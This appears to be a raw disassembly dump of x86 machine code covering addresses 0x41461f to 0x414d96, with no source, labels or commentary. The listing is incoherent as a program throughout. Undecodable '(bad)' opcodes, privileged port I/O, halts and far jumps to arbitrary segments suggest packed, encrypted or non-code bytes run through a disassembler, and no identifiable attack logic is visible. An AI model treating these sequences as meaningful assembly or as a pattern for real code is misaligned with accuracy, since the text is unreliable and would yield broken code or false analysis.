  41461f:	jge    0x4145f7
  414621:	into   
  414622:	and    WORD PTR [eax],cx
  414625:	jae    0x41469e
  414627:	fs sub dh,dh
  41462a:	xor    DWORD PTR [edx+0x72],edi
  41462d:	mov    BYTE PTR [esi],al
  41462f:	and    ah,dl
  414631:	call   0xff59:0x13bd0fc2
  414638:	aaa    
  414639:	xor    eax,0x8b964039
  41463e:	jg     0x414627
  414640:	in     al,0xc7
  414642:	add    al,0x15
  414644:	idiv   ecx
  414646:	or     ah,BYTE PTR [edx]
  414648:	aas    
  414649:	test   BYTE PTR [esi],bl
  41464b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41464c:	int3   
  41464d:	mov    dh,0xc
  41464f:	call   0xe1f5fef7
  414654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414655:	and    bl,BYTE PTR [edx+edx*8+0x6b]
  414659:	xlat   BYTE PTR ds:[ebx]
  41465a:	es cwde 
  41465c:	outs   dx,BYTE PTR ds:[esi]
  41465d:	lea    ecx,[ecx+ebp*4+0x65]
  414661:	dec    edx
  414662:	dec    eax
  414663:	mov    al,ds:0x1abc1ffc
  414668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414669:	xchg   ebp,eax
  41466a:	sub    al,0xa3
  41466c:	cmp    BYTE PTR [ecx+0x13],ah
  41466f:	(bad)  
  414671:	dec    ebp
  414672:	adc    DWORD PTR [ebp+0x3f],edx
  414675:	retf   
  414676:	jle    0x414632
  414678:	jl     0x4146ab
  41467a:	lods   al,BYTE PTR ds:[esi]
  41467b:	mov    ch,0x16
  41467d:	ins    BYTE PTR es:[edi],dx
  41467e:	sti    
  41467f:	add    eax,0x75646769
  414684:	enter  0xddef,0x2c
  414688:	retf   
  414689:	xchg   BYTE PTR [ebx+edx*4-0x16],bl
  41468d:	dec    edi
  41468e:	mov    esp,0x8fc576d2
  414693:	add    cl,BYTE PTR [edx]
  414695:	out    0xb,al
  414697:	fiadd  DWORD PTR [ebx]
  414699:	ret    
  41469a:	adc    BYTE PTR [edx],bh
  41469c:	sbb    dx,WORD PTR [edx-0x2d]
  4146a0:	push   cs
  4146a1:	push   0x98d705e4
  4146a6:	jl     0x414657
  4146a8:	ins    DWORD PTR es:[edi],dx
  4146a9:	xchg   ebx,eax
  4146aa:	not    BYTE PTR [ebx+ebx*1-0x329db610]
  4146b1:	pop    es
  4146b2:	scas   al,BYTE PTR es:[edi]
  4146b3:	mov    ah,0xa2
  4146b5:	cwde   
  4146b6:	xchg   esi,eax
  4146b7:	scas   eax,DWORD PTR es:[edi]
  4146b8:	rol    BYTE PTR [edi+0x531c4ba5],0x82
  4146bf:	mov    cl,0x9e
  4146c1:	in     al,0xc2
  4146c3:	mov    ds:0xe25da856,al
  4146c8:	mov    al,ds:0xbae60479
  4146cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146ce:	popf   
  4146cf:	mov    gs:0xfd202290,al
  4146d5:	lock cmp bl,BYTE PTR [edx-0x1d]
  4146d9:	addr16 (bad) 
  4146db:	fnstenv [edx-0x1e]
  4146de:	mov    DWORD PTR [edi+0x370322dc],ebp
  4146e4:	test   DWORD PTR [edi+edi*1],esp
  4146e7:	fidivr DWORD PTR [edx]
  4146e9:	xchg   ecx,eax
  4146ea:	add    dh,ch
  4146ec:	dec    ecx
  4146ed:	(bad)  
  4146ee:	ficomp DWORD PTR [eax-0x64ba8f15]
  4146f4:	mov    edx,0x68ea3fa3
  4146f9:	mov    dh,0x4c
  4146fb:	enter  0x847a,0x8e
  4146ff:	adc    BYTE PTR [esp+edi*8+0x12],ch
  414703:	fsubr  st,st(7)
  414705:	pop    ss
  414706:	scas   eax,DWORD PTR es:[edi]
  414707:	std    
  414708:	mov    bl,0xba
  41470a:	retf   
  41470b:	int3   
  41470c:	sub    esp,DWORD PTR [eax]
  41470e:	sub    eax,0x71adf94c
  414713:	mov    dl,dl
  414715:	adc    al,0x99
  414717:	in     eax,0x44
  414719:	adc    al,0xbe
  41471b:	call   0xee5e:0x92c3e29e
  414722:	xor    al,ch
  414724:	mov    ds:0xc66ddfeb,eax
  414729:	mov    eax,0x8fe578d7
  41472e:	stos   BYTE PTR es:[edi],al
  41472f:	sbb    ebp,edi
  414731:	mov    BYTE PTR [eax-0x2c57a988],dl
  414737:	call   0xb27a2e24
  41473c:	sbb    DWORD PTR [ebx-0x59],ebx
  41473f:	data16 mov gs:0x43a3f66,al
  414746:	hlt    
  414747:	fs dec esi
  414749:	dec    ebx
  41474a:	lock push 0x3da1da21
  414750:	mov    eax,0xb4239865
  414755:	xchg   ecx,eax
  414756:	xor    DWORD PTR [esi-0x6f8722ba],0xffffffe8
  41475d:	aad    0x3c
  41475f:	ficom  DWORD PTR [eax+ebx*2-0x74]
  414763:	aam    0xf0
  414765:	cmp    eax,0x60bbf706
  41476a:	add    al,BYTE PTR [edi]
  41476c:	jg     0x4146f9
  41476e:	cmp    DWORD PTR [edx],edi
  414770:	stos   BYTE PTR es:[edi],al
  414771:	sahf   
  414772:	rol    DWORD PTR [ecx-0x4a60010c],1
  414778:	jb     0x414704
  41477a:	cwde   
  41477b:	dec    edi
  41477c:	fstp   TBYTE PTR [edx+0x20]
  41477f:	push   ecx
  414780:	inc    ebp
  414781:	cs add ecx,0x3f48c2f6
  414788:	mov    ds:0x3e6fb61e,al
  41478d:	dec    edi
  41478e:	dec    esi
  41478f:	adc    ebp,ebx
  414791:	ja     0x414759
  414793:	test   BYTE PTR [eax-0x7de877ad],dl
  414799:	sbb    eax,0x72bfb164
  41479e:	data16 cmp al,0x41
  4147a1:	push   esi
  4147a2:	scas   eax,DWORD PTR es:[edi]
  4147a3:	jmp    0x41473c
  4147a5:	pop    edi
  4147a6:	xchg   esp,eax
  4147a7:	test   BYTE PTR [edx],cl
  4147a9:	outs   dx,BYTE PTR ds:[esi]
  4147aa:	xchg   DWORD PTR [esi],ebp
  4147ac:	scas   eax,DWORD PTR es:[edi]
  4147ad:	out    0x6,eax
  4147af:	bound  edi,QWORD PTR [esi-0x28]
  4147b2:	adc    DWORD PTR [ecx],ebx
  4147b4:	test   BYTE PTR [ecx+0x401291a],ah
  4147ba:	data16 mov cl,0xad
  4147bd:	ret    
  4147be:	fiadd  DWORD PTR [ecx+esi*1-0x1f7846ef]
  4147c5:	pop    ebx
  4147c6:	pop    ds
  4147c7:	pop    ebx
  4147c8:	mov    ah,0x58
  4147ca:	pop    ebp
  4147cb:	jmp    0x41475d
  4147cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ce:	sbb    BYTE PTR [edx],al
  4147d0:	lds    esp,FWORD PTR ds:0xb0fc32cc
  4147d6:	sbb    al,0x96
  4147d8:	push   ss
  4147d9:	or     eax,0x3740617e
  4147de:	lahf   
  4147df:	push   es
  4147e0:	lods   al,BYTE PTR ds:[esi]
  4147e1:	test   eax,0xb624854e
  4147e6:	ins    BYTE PTR es:[edi],dx
  4147e7:	fwait
  4147e8:	jle    0x414770
  4147ea:	rol    BYTE PTR [esp+edx*4+0x976f216],1
  4147f1:	shl    DWORD PTR [edi+0x489dc0f7],0x1f
  4147f8:	jo     0x41477a
  4147fa:	in     eax,dx
  4147fb:	scas   eax,DWORD PTR es:[edi]
  4147fc:	and    eax,0xbe29edf8
  414801:	leave  
  414802:	scas   al,BYTE PTR es:[edi]
  414803:	hlt    
  414804:	sub    ch,BYTE PTR [edi-0xce5659c]
  41480a:	sbb    BYTE PTR [eax-0x368cf3cc],ah
  414810:	jo     0x414851
  414812:	dec    ebx
  414813:	dec    ecx
  414814:	ret    0xb329
  414817:	xchg   ebx,eax
  414818:	mov    bh,0x2
  41481a:	aad    0x93
  41481c:	test   DWORD PTR [eax-0x5a91eade],ebp
  414822:	or     eax,0xcbda5d76
  414827:	(bad)  [edx]
  414829:	jae    0x4147bc
  41482b:	lods   al,BYTE PTR ds:[esi]
  41482c:	fistp  DWORD PTR [esi]
  41482e:	ror    dh,0x99
  414831:	(bad)  
  414832:	jmp    0x7525c32d
  414837:	dec    eax
  414838:	jns    0x414831
  41483a:	pop    ds
  41483b:	push   ds
  41483c:	scas   eax,DWORD PTR es:[edi]
  41483d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41483e:	ins    DWORD PTR es:[edi],dx
  41483f:	dec    ebx
  414840:	out    0x29,al
  414842:	push   ebx
  414843:	cmp    DWORD PTR [ebx+0x3c8e7bc8],edi
  414849:	push   0xd775c2d6
  41484e:	and    edi,ecx
  414850:	add    eax,0x2463618f
  414855:	jo     0x4147f8
  414857:	push   ebx
  414858:	rcr    eax,cl
  41485a:	sbb    ecx,DWORD PTR [esi]
  41485c:	pop    edx
  41485d:	jmp    0x414878
  41485f:	sub    eax,0xcba3deb7
  414864:	scas   al,BYTE PTR es:[edi]
  414865:	xor    ebp,DWORD PTR ds:0x4a2422
  41486b:	mov    bl,0xd2
  41486d:	in     eax,0x83
  41486f:	xchg   BYTE PTR [edi],bh
  414871:	adc    ebx,DWORD PTR [esi+0x4a]
  414874:	sbb    bl,BYTE PTR [esi]
  414876:	inc    ebx
  414877:	test   al,0x7a
  414879:	scas   eax,DWORD PTR es:[edi]
  41487a:	push   ebx
  41487b:	mov    ch,0x87
  41487d:	outs   dx,DWORD PTR ds:[esi]
  41487e:	(bad)  [esi-0x2]
  414881:	iret   
  414882:	sbb    ecx,0x3f
  414885:	add    BYTE PTR ds:0xececb28,bl
  41488b:	lods   al,BYTE PTR ds:[esi]
  41488c:	repnz cmp BYTE PTR [eax],dl
  41488f:	and    eax,0x440b9cc5
  414894:	pop    es
  414895:	je     0x4148d5
  414897:	loop   0x414864
  414899:	sahf   
  41489a:	xchg   DWORD PTR [edx],eax
  41489c:	in     al,0x7d
  41489e:	ror    BYTE PTR [esp+eiz*8],1
  4148a1:	jo     0x4148ca
  4148a3:	dec    edi
  4148a4:	and    BYTE PTR [edx-0x4da20fc7],ch
  4148aa:	pop    ds
  4148ab:	sbb    ch,BYTE PTR [esi]
  4148ad:	rcr    DWORD PTR [ecx+0x18],cl
  4148b0:	jae    0x414871
  4148b2:	out    0xc2,al
  4148b4:	inc    ebp
  4148b5:	(bad)  
  4148b6:	psllq  mm1,mm2
  4148b9:	pop    es
  4148ba:	fcom   st(4)
  4148bc:	fmul   DWORD PTR [esi+0x65]
  4148bf:	in     eax,0xf5
  4148c1:	clc    
  4148c2:	cmp    BYTE PTR [edi-0x1e],dh
  4148c5:	and    dh,BYTE PTR [esi-0xb]
  4148c8:	mov    bl,BYTE PTR [esp+ecx*2+0x26]
  4148cc:	push   0xffffffe4
  4148ce:	adc    al,0x66
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	es ins DWORD PTR es:[edi],dx
  4148d3:	push   ebp
  4148d4:	add    al,0xda
  4148d6:	sbb    BYTE PTR [ebp+ecx*8-0x37],dh
  4148da:	clc    
  4148db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148dc:	mov    al,BYTE PTR [eax]
  4148de:	and    DWORD PTR [eax+edi*8],ecx
  4148e1:	retf   0x62f5
  4148e4:	push   edi
  4148e5:	add    al,0x78
  4148e7:	inc    eax
  4148e8:	adc    BYTE PTR [ebp+0x6e7f2aa4],al
  4148ee:	lahf   
  4148ef:	aad    0xbc
  4148f1:	mov    ds:0x41dab53c,eax
  4148f6:	sbb    bl,BYTE PTR [ebp+0x221f4462]
  4148fc:	iret   
  4148fd:	jmp    0xdadd:0x83cd07fb
  414904:	jns    0x4148c6
  414906:	and    eax,0xc43e7d78
  41490b:	inc    ebp
  41490c:	and    esi,DWORD PTR [esi]
  41490e:	ret    
  41490f:	daa    
  414910:	push   ds
  414911:	adc    eax,0xe6dc7993
  414916:	sahf   
  414917:	push   esp
  414918:	dec    eax
  414919:	add    BYTE PTR [ebx],cl
  41491b:	out    dx,al
  41491c:	jo     0x41493c
  41491e:	mov    esp,0x99dab307
  414923:	loopne 0x414976
  414925:	jno    0x41493d
  414927:	(bad)  
  414929:	nop
  41492a:	lods   eax,DWORD PTR ds:[esi]
  41492b:	shl    ah,cl
  41492d:	add    eax,0x4d4f2dc4
  414932:	(bad)  
  414933:	test   eax,0x55705af6
  414938:	mov    al,ds:0x7876bf25
  41493d:	mov    cl,bl
  41493f:	mov    BYTE PTR [eax+0x10],bl
  414942:	xlat   BYTE PTR ds:[ebx]
  414943:	enter  0xcbfe,0x2c
  414947:	xchg   edx,eax
  414948:	into   
  414949:	jbe    0x414931
  41494b:	jo     0x414912
  41494d:	dec    eax
  41494e:	ja     0x41498b
  414950:	popf   
  414951:	(bad)  
  414952:	das    
  414953:	mov    edi,0xd11412fe
  414958:	mov    ds:0x21ccee22,al
  41495d:	out    dx,al
  41495e:	cmp    DWORD PTR [ebx+edx*8-0xc28085b],0x69
  414966:	clc    
  414967:	int    0x90
  414969:	mov    dl,0x10
  41496b:	push   edx
  41496c:	mov    gs,WORD PTR [eax]
  41496e:	jnp    0x414900
  414970:	lds    esp,FWORD PTR [edx+0x41f32dca]
  414976:	test   BYTE PTR [edx],ah
  414978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414979:	mov    esp,DWORD PTR [edx]
  41497b:	int    0x27
  41497d:	dec    esi
  41497e:	push   esi
  41497f:	push   eax
  414980:	jmp    0xc48006e3
  414985:	add    BYTE PTR [edx+0x1f],ch
  414988:	adc    al,0x66
  41498a:	aad    0x6e
  41498c:	mov    ecx,0x7a1090a3
  414991:	cmp    cl,BYTE PTR [ebx-0x696915b]
  414997:	fdivr  DWORD PTR [ebx]
  414999:	gs jcxz 0x414938
  41499d:	pop    esp
  41499e:	cmp    al,0xe7
  4149a0:	push   0xc8fff5cd
  4149a5:	enter  0x8599,0x22
  4149a9:	enter  0x41b0,0x0
  4149ad:	push   ds
  4149ae:	jle    0x4149e9
  4149b0:	add    ebx,0x2
  4149b3:	mov    eax,0xe6ae5362
  4149b8:	lods   eax,DWORD PTR ds:[esi]
  4149b9:	call   0x9869528a
  4149be:	stc    
  4149bf:	int    0x14
  4149c1:	mov    esp,0x43599574
  4149c6:	imul   edx,DWORD PTR [edx],0x1
  4149c9:	dec    ebx
  4149ca:	inc    esp
  4149cb:	arpl   WORD PTR [edx+0x3b9c672],di
  4149d1:	cmp    cl,BYTE PTR [ecx+0x62]
  4149d4:	sub    DWORD PTR [eax-0x1c],eax
  4149d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d8:	push   ebx
  4149d9:	test   BYTE PTR [ecx],0x76
  4149dc:	sti    
  4149dd:	imul   esp,DWORD PTR [ebx+0x63a1868a],0xffffff9b
  4149e4:	mov    WORD PTR [edi+0x25a4e7d7],es
  4149ea:	jmp    0xce3b597a
  4149ef:	push   edx
  4149f0:	cs push eax
  4149f2:	mov    ebx,0xed11b8cc
  4149f7:	(bad)  
  4149f8:	pushf  
  4149f9:	pop    esi
  4149fa:	push   edi
  4149fb:	arpl   WORD PTR cs:[esi+0x6b3a06c2],di
  414a02:	pop    esi
  414a03:	stos   BYTE PTR es:[edi],al
  414a04:	loopne 0x414a7f
  414a06:	dec    ecx
  414a07:	jp     0x414a86
  414a09:	push   edi
  414a0a:	je     0x414a88
  414a0c:	loop   0x4149de
  414a0e:	in     al,0x7e
  414a10:	jnp    0x414a66
  414a12:	jmp    0x6165bfec
  414a17:	cli    
  414a18:	mov    edx,0x8fca24fb
  414a1d:	xlat   BYTE PTR ds:[ebx]
  414a1e:	jecxz  0x4149a7
  414a20:	sub    eax,0xb8a84bbc
  414a25:	jp     0x414a5b
  414a27:	sub    edx,edx
  414a29:	add    DWORD PTR [ebx+0x4fe0a7a],edi
  414a2f:	in     eax,0x46
  414a31:	push   ebx
  414a32:	push   es
  414a33:	lds    edi,FWORD PTR [esi+0x64f2fe1b]
  414a39:	cli    
  414a3a:	xchg   esi,eax
  414a3b:	ds das 
  414a3d:	mov    ds:0xd2a7f72d,al
  414a42:	loopne 0x414a8e
  414a44:	pop    ss
  414a45:	cwde   
  414a46:	jmp    0x601b:0xfa78d44d
  414a4d:	fiadd  WORD PTR [ecx+0x5026b2af]
  414a53:	jecxz  0x414ac9
  414a55:	(bad)  
  414a56:	jmp    0x2f61:0xfa3ad222
  414a5d:	sub    DWORD PTR [ecx+0x79e214b6],eax
  414a63:	or     DWORD PTR [ecx+ebp*1-0x6324eeff],ebp
  414a6a:	pop    ss
  414a6b:	aam    0xe5
  414a6d:	cmc    
  414a6e:	imul   esi,DWORD PTR [edi+ebx*2+0x44],0x5c
  414a73:	mov    bl,0xb1
  414a75:	mov    eax,ds:0x1a671b09
  414a7a:	in     al,0x5c
  414a7c:	mov    bl,0x34
  414a7e:	mov    cl,0xc2
  414a80:	les    edx,FWORD PTR [edx]
  414a82:	push   edx
  414a83:	ret    
  414a84:	rol    BYTE PTR [ecx],cl
  414a86:	mov    bl,BYTE PTR cs:[esp+ebp*2+0x66]
  414a8b:	ret    
  414a8c:	cld    
  414a8d:	call   0x3cb2:0xfaec28cf
  414a94:	and    eax,0xc3a31588
  414a99:	out    0xf,eax
  414a9b:	and    eax,0x830824dc
  414aa0:	sub    DWORD PTR [eax+edi*2-0x2b67419f],ebp
  414aa7:	ins    DWORD PTR es:[edi],dx
  414aa8:	(bad)  
  414aa9:	cmp    edx,esp
  414aab:	in     eax,dx
  414aac:	adc    eax,0x2d43811c
  414ab1:	push   es
  414ab2:	xchg   edi,eax
  414ab3:	adc    al,ah
  414ab5:	jg     0x414a9e
  414ab7:	mov    ch,0xb7
  414ab9:	dec    DWORD PTR [esi]
  414abb:	push   0xa5f06b1f
  414ac0:	jg     0x414ace
  414ac2:	retf   0x83a7
  414ac5:	in     al,0xe0
  414ac7:	aaa    
  414ac8:	xor    ebx,DWORD PTR [ecx-0x5667587c]
  414ace:	sub    al,0x6c
  414ad0:	das    
  414ad1:	loop   0x414b4d
  414ad3:	jno    0x414aa0
  414ad5:	lea    edx,[eax]
  414ad7:	stos   BYTE PTR es:[edi],al
  414ad8:	and    edi,DWORD PTR [ecx-0x7c]
  414adb:	mov    ds:0xd44e439b,eax
  414ae0:	jmp    0x87727e7c
  414ae5:	xchg   BYTE PTR [ecx],cl
  414ae7:	int    0x5f
  414ae9:	arpl   WORD PTR [ecx+0x45],bp
  414aec:	lods   eax,DWORD PTR ds:[esi]
  414aed:	scas   eax,DWORD PTR es:[edi]
  414aee:	jge    0x414b4f
  414af0:	in     eax,dx
  414af1:	mov    bl,0xb2
  414af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414af4:	xchg   edi,eax
  414af5:	xchg   edi,eax
  414af6:	jne    0x414ae8
  414af8:	jo     0x414b3f
  414afa:	test   bh,0x2c
  414afd:	mov    bh,0x58
  414aff:	cmp    ebp,DWORD PTR [esi+0x7c]
  414b02:	sub    eax,0xe53c5652
  414b07:	cmp    BYTE PTR [edx-0x55],dh
  414b0a:	inc    ebp
  414b0b:	arpl   dx,ax
  414b0d:	xchg   DWORD PTR [edx],edi
  414b0f:	pop    eax
  414b10:	fs xchg esi,eax
  414b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b13:	push   es
  414b14:	xor    eax,0x18c9fa29
  414b19:	cmp    esi,ebx
  414b1b:	lods   al,BYTE PTR ds:[esi]
  414b1c:	sub    BYTE PTR [edx+0x2b],bh
  414b1f:	mov    eax,ds:0xc0ceac41
  414b24:	adc    edx,DWORD PTR [eax]
  414b26:	cmp    dh,bl
  414b28:	push   ebx
  414b29:	ins    DWORD PTR es:[edi],dx
  414b2a:	mov    al,ds:0x6cb06927
  414b2f:	cmp    dh,BYTE PTR [ecx]
  414b31:	mov    dl,0xfa
  414b33:	push   esp
  414b34:	(bad)  
  414b35:	mov    al,ds:0xb7308ae1
  414b3a:	xchg   BYTE PTR [edx-0xd],al
  414b3d:	sar    esi,cl
  414b3f:	jp     0x414af0
  414b41:	test   ebp,0xbaad0764
  414b47:	sti    
  414b48:	push   ecx
  414b49:	push   dx
  414b4b:	pop    ebp
  414b4c:	cmp    ecx,DWORD PTR ds:0x3f069388
  414b52:	cmp    al,0x94
  414b54:	sahf   
  414b55:	jns    0x414b2e
  414b57:	jns    0x414b56
  414b59:	and    esi,DWORD PTR [edi]
  414b5b:	xchg   BYTE PTR [eax-0x40],dl
  414b5e:	or     al,0x20
  414b60:	data16 fadd QWORD PTR [ebp+0xed747a0]
  414b67:	push   ss
  414b68:	push   ebx
  414b69:	inc    eax
  414b6a:	outs   dx,DWORD PTR ds:[esi]
  414b6b:	push   ebx
  414b6c:	arpl   WORD PTR [edi+0x4d],bx
  414b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b70:	(bad)  
  414b72:	adc    BYTE PTR [ecx],al
  414b74:	adc    eax,0x35ef35da
  414b79:	mov    bh,0xcf
  414b7b:	pop    ebx
  414b7c:	jecxz  0x414b38
  414b7e:	push   ecx
  414b7f:	cwde   
  414b80:	push   ecx
  414b81:	jl     0x414bae
  414b83:	xchg   edx,eax
  414b84:	or     DWORD PTR [ecx+0x1b0c747b],edx
  414b8a:	pop    ebx
  414b8b:	fwait
  414b8c:	aas    
  414b8d:	pop    eax
  414b8e:	fstp   st(0)
  414b90:	in     al,dx
  414b91:	call   DWORD PTR [esi+0x1e]
  414b94:	inc    ebp
  414b95:	pop    esp
  414b96:	in     al,dx
  414b97:	mov    esp,0x117213fd
  414b9c:	jnp    0x414bc6
  414b9e:	dec    ecx
  414b9f:	fiadd  DWORD PTR [edx]
  414ba1:	sbb    BYTE PTR [edx+0x24],bh
  414ba4:	and    DWORD PTR [esi+0x55],edx
  414ba7:	leave  
  414ba8:	xchg   esi,eax
  414ba9:	or     edx,DWORD PTR [ebx+0x8bcdf88]
  414baf:	cdq    
  414bb0:	ds jl  0x414b6d
  414bb3:	push   esp
  414bb4:	inc    esp
  414bb5:	ret    0xaedd
  414bb8:	sbb    al,0x43
  414bba:	adc    ebx,DWORD PTR [edx+0x57]
  414bbd:	cmp    eax,0xd7cd43fe
  414bc2:	and    ecx,edx
  414bc4:	in     eax,dx
  414bc5:	push   esp
  414bc6:	add    BYTE PTR [ecx],bl
  414bc8:	gs (bad) 
  414bca:	fsubp  st(5),st
  414bcc:	(bad)  
  414bcd:	sbb    esi,ebp
  414bcf:	inc    esi
  414bd0:	adc    BYTE PTR [ebp+0x1d4ebef5],cl
  414bd6:	aad    0xa0
  414bd8:	xor    BYTE PTR [eax+0x70],al
  414bdb:	loope  0x414b8c
  414bdd:	stos   DWORD PTR es:[edi],eax
  414bde:	or     BYTE PTR [esi-0x433e1e44],0x19
  414be5:	mov    ds:0x55d53849,eax
  414bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414beb:	dec    esi
  414bec:	sub    esp,DWORD PTR [ecx+0x77]
  414bef:	nop
  414bf0:	stc    
  414bf1:	push   eax
  414bf2:	rcr    ch,cl
  414bf4:	jns    0x414bbb
  414bf6:	and    al,0x79
  414bf8:	fldcw  WORD PTR [eax-0x9d2dfff]
  414bfe:	pop    es
  414bff:	jmp    0x48e0c8d3
  414c04:	mov    edx,0xd4396789
  414c09:	inc    ebx
  414c0a:	mov    esi,0xaf3c56e4
  414c0f:	or     al,0xe7
  414c11:	xchg   ebp,eax
  414c12:	lea    ebp,[esp+edi*8-0x40]
  414c16:	call   0x692421d0
  414c1b:	xor    DWORD PTR [edi],edx
  414c1d:	cmp    esp,DWORD PTR [esi-0x39ea71a7]
  414c23:	mov    cl,0x2
  414c25:	sbb    al,0x1c
  414c27:	shl    BYTE PTR [ebp-0x1fa672ea],0x85
  414c2e:	dec    ebp
  414c2f:	les    esi,FWORD PTR [edx+0x67]
  414c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c33:	jnp    0x414cae
  414c35:	sub    esi,DWORD PTR [ebx-0xe]
  414c38:	int    0x7b
  414c3a:	dec    edi
  414c3b:	les    edi,FWORD PTR [esi+0x43]
  414c3e:	mov    ebp,0x3b061f35
  414c43:	outs   dx,DWORD PTR ds:[esi]
  414c44:	and    dl,BYTE PTR [edi-0x18]
  414c47:	and    al,0x23
  414c49:	mov    BYTE PTR [edx+0x45],cl
  414c4c:	ss aam 0xea
  414c4f:	pusha  
  414c50:	cs push ds
  414c52:	retf   
  414c53:	mov    ss,WORD PTR [edi]
  414c55:	pushf  
  414c56:	(bad)  
  414c57:	xchg   ebx,eax
  414c58:	mul    BYTE PTR ds:0x9f2e3a8c
  414c5e:	ret    0x28f0
  414c61:	out    0xbe,al
  414c63:	std    
  414c64:	rcr    esp,cl
  414c66:	jns    0x414c38
  414c68:	cmp    al,0xdf
  414c6a:	scas   al,BYTE PTR es:[edi]
  414c6b:	sbb    ebp,eax
  414c6d:	pop    es
  414c6e:	inc    ebx
  414c6f:	sar    DWORD PTR [eax-0x9],cl
  414c72:	add    bl,bl
  414c74:	jmp    0x10296af9
  414c79:	xchg   BYTE PTR [edi+0x6f722f7a],al
  414c7f:	cmp    al,0x28
  414c81:	pop    es
  414c82:	mov    al,BYTE PTR [edi+0x23]
  414c85:	jge    0x414c8a
  414c87:	ss bnd jne 0x414cf7
  414c8b:	aaa    
  414c8c:	es mulps xmm1,xmm0
  414c90:	pop    esi
  414c91:	fisub  WORD PTR [edi]
  414c93:	fild   WORD PTR [esi-0x15]
  414c96:	jnp    0x414c25
  414c98:	jge    0x414c5f
  414c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c9c:	pop    ss
  414c9d:	repnz inc ebp
  414c9f:	cs xchg esp,eax
  414ca1:	push   cs
  414ca2:	lods   al,BYTE PTR ds:[esi]
  414ca3:	cdq    
  414ca4:	rol    BYTE PTR [esi-0x48],0xf1
  414ca8:	sar    DWORD PTR [ebx],cl
  414caa:	pop    ss
  414cab:	push   0xdeb302cc
  414cb0:	and    eax,0xb834bc57
  414cb5:	adc    DWORD PTR ds:[edi+0x1e],esp
  414cb9:	cwde   
  414cba:	lods   eax,DWORD PTR ds:[esi]
  414cbb:	xchg   ebx,eax
  414cbc:	cwde   
  414cbd:	jae    0x414d0f
  414cbf:	mov    dl,0xd6
  414cc1:	or     BYTE PTR [ecx-0x3eacf6e0],cl
  414cc7:	stos   DWORD PTR es:[edi],eax
  414cc8:	fistp  QWORD PTR [ebx]
  414cca:	sub    DWORD PTR [eax-0x80],ebp
  414ccd:	sbb    BYTE PTR [ecx],dl
  414ccf:	xchg   esi,eax
  414cd0:	mov    dl,0x71
  414cd2:	sub    eax,0x9f3959ab
  414cd7:	ja     0x414d27
  414cd9:	popa   
  414cda:	mov    dh,0xcc
  414cdc:	jnp    0x414cb0
  414cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cdf:	cwde   
  414ce0:	pop    esi
  414ce1:	inc    eax
  414ce2:	adc    DWORD PTR [eax-0x18],esi
  414ce5:	xor    cl,BYTE PTR [ebp+eax*4+0x463bb04a]
  414cec:	scas   eax,DWORD PTR es:[edi]
  414ced:	xor    BYTE PTR [ecx+0x47],0xd7
  414cf1:	imul   ecx,DWORD PTR [esi-0x588b26bf],0xf94b1113
  414cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cfc:	pop    ebx
  414cfd:	add    al,0x35
  414cff:	imul   edx,DWORD PTR [ecx],0xf55f535f
  414d05:	push   esi
  414d06:	mov    al,ds:0x6d58b465
  414d0b:	pusha  
  414d0c:	das    
  414d0d:	dec    edi
  414d0e:	lahf   
  414d0f:	push   eax
  414d10:	pop    esi
  414d11:	stos   BYTE PTR es:[edi],al
  414d12:	cld    
  414d13:	sar    BYTE PTR [ebp+0x8],0x99
  414d17:	mov    ch,0xda
  414d19:	pop    ebx
  414d1a:	div    bh
  414d1c:	xor    DWORD PTR [eax+0xa],eax
  414d1f:	pop    edi
  414d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d21:	sub    BYTE PTR [edx+0x2f],bl
  414d24:	gs inc ebp
  414d26:	xor    al,0x85
  414d28:	push   ebx
  414d29:	pop    edx
  414d2a:	mov    esp,0xdf01ba00
  414d2f:	and    DWORD PTR [edi-0x68],ebx
  414d32:	mov    edx,0x2766e095
  414d37:	bound  ecx,QWORD PTR ds:0xdadda333
  414d3d:	mov    al,ds:0x77bfb915
  414d42:	enter  0x97b7,0xec
  414d46:	mov    ch,0xcc
  414d48:	dec    ebx
  414d49:	xor    eax,0xbd3d7d29
  414d4e:	je     0x414da8
  414d50:	in     eax,0x76
  414d52:	mov    ebp,0x28531476
  414d57:	cs dec ebp
  414d59:	sbb    bh,al
  414d5b:	sub    BYTE PTR [edx+ebp*1-0x20811263],dh
  414d62:	mov    DWORD PTR [ebp-0x18792229],esi
  414d68:	mov    ebx,0x32071700
  414d6d:	adc    ebp,esi
  414d6f:	xchg   esp,eax
  414d70:	xchg   ecx,eax
  414d71:	rcr    esp,0xdf
  414d74:	mov    ds:0xac26086e,al
  414d79:	out    dx,al
  414d7a:	jae    0x414dd0
  414d7c:	push   edi
  414d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d7e:	sub    ebx,DWORD PTR [ebx-0x4e]
  414d81:	pop    ds
  414d82:	scas   eax,DWORD PTR es:[edi]
  414d83:	into   
  414d84:	add    al,0x3c
  414d86:	pop    edx
  414d87:	(bad)  
  414d88:	jns    0x414dc6
  414d8a:	mov    al,0x2
  414d8c:	mov    fs,esi
  414d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d8f:	hlt    
  414d90:	popf   
  414d91:	lock enter 0x7d1,0x6a
  414d96:	adc    BYTE PTR [esi+0x34],dh
